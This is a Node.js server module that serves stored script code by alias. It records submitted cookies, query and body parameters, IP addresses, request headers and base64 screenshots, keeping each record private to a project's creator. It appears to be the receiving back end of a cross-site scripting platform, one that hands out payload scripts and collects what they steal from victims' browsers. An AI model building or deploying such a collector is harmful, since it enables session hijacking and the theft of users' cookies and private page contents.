const CACHE_KEY_MAP = {
    'alias': '__PROJECT__ALIAS',
    'getParams': '__DATA__LOG__USER'
}

function cacheKey (key, type) {
    return CACHE_KEY_MAP[type] + key
}

function getByAlias (req, res) {
    if (!req.query.id) return res.end()
    const alias = req.query.id

    if (LRUCache.has(cacheKey(alias, 'alias'))) {
        return res.send(LRUCache.get(cacheKey(alias, 'alias')))
    }

    const query = new AV.Query('Project')
        query.equalTo('alias', alias)
        query.first()
            .then(project => {
                if (!project) {
                    res.end()
                } else {
                    LRUCache.set(cacheKey(alias, 'alias'), project.get('code'))
                    res.send(project.get('code'))
                }
            })
            .catch(err => {
                console.error('Error at getByAlias', err)
            })
}

function delAliasCache (req, res) {
    if (!req.query.id) return res.send({
        error: true,
        msg: 'id is must be required'
    })
    LRUCache.del(cacheKey(req.query.id, 'alias'))
    res.send({
        error: false
    })
}

function getParams (req, res) {
    if (!req.query.id) return res.send({
        error: true,
        msg: 'id is must be required'
    })

    if (LRUCache.has(cacheKey(req.query.id, 'alias-user'))) {
        return saveDataLog(req, res, LRUCache.get(cacheKey(req.query.id, 'alias-user')))
    }

    const projectQuery = new AV.Query('Project')
    projectQuery.equalTo('alias', req.query.id)
    projectQuery.first()
        .then(project => {
            if (project) {
                LRUCache.set(cacheKey(req.query.id, 'alias-user'), project.get('creator'))
                saveDataLog(req, res, project.get('creator'))
            } else {
                res.send({
                    error: true,
                    msg: 'invalid id'
                })
            }
        })
        
}

function saveDataLog (req, res, user) {
    const DataLog = AV.Object.extend('DataLog')
    const dataLog = new DataLog()

    if (req.query.id) {
        dataLog.set('alias', req.query.id)
    }
    if (Object.keys(req.query).length) {
        dataLog.set('get', req.query)
    }
    if (Object.keys(req.body).length) {
        dataLog.set('post', req.body)
    }
    if (req.query.cookie) {
        dataLog.set('cookie', req.query.cookie)
    }
    if (req.body.cookie) {
        dataLog.set('cookie', req.body.cookie)
    }
    dataLog.set('ip', req.connection.remoteAddress)
    dataLog.set('header', req.headers)

    // acl
    const acl = new AV.ACL()
    acl.setPublicReadAccess(false)
    acl.setPublicWriteAccess(false)
    acl.setWriteAccess(user, true)
    acl.setReadAccess(user, true)
    dataLog.setACL(acl)

    dataLog.save().then(log => {
        res.send({
            error: false
        })
    })
    .catch(err => {
        console.log('Error at getParams: ', err)
        res.send({
            error: true
        })
    })
}

function getScreenshot (req, res) {
    if (!req.body.file || !req.body.id) return res.send({
        error: true,
        msg: 'file and id are must be required'
    })

    if (LRUCache.has(cacheKey(req.body.id, 'alias-user'))) {
        return saveScreenshot(req, res, LRUCache.get(cacheKey(req.body.id, 'alias-user')))
    }

    const projectQuery = new AV.Query('Project')
    projectQuery.equalTo('alias', req.body.id)
    projectQuery.first()
        .then(project => {
            if (project) {
                LRUCache.set(cacheKey(req.body.id, 'alias-user'), project.get('creator'))
                saveScreenshot(req, res, project.get('creator'))
            } else {
                res.send({
                    error: true,
                    msg: 'invalid id'
                })
            }
        })

}

function saveScreenshot (req, res, user) {
    const data = { base64: req.body.file.substring(23) }
    const file = new AV.File('screenshot-' + (new Date()).getTime() + '.jpg', data)

    file.save()
        .then(savedFile => {
            const Screenshot = AV.Object.extend('Screenshot')
            const screenshot = new Screenshot()

            // acl
            const acl = new AV.ACL()
            acl.setPublicReadAccess(false)
            acl.setPublicWriteAccess(false)
            acl.setWriteAccess(user, true)
            acl.setReadAccess(user, true)
            screenshot.setACL(acl)
            screenshot.set('file', savedFile)
            screenshot.set('alias', req.body.id)
            return screenshot.save()
        })
        .then(sc => {
            res.send({
                error: false
            })
        })
        .catch(err => {
            console.log('Error at saveScreenshot: ', err)
            res.send({
                error: true
            })
        })
}

module.exports.getByAlias = getByAlias
module.exports.delAliasCache = delAliasCache
module.exports.getParams = getParams
module.exports.getScreenshot = getScreenshot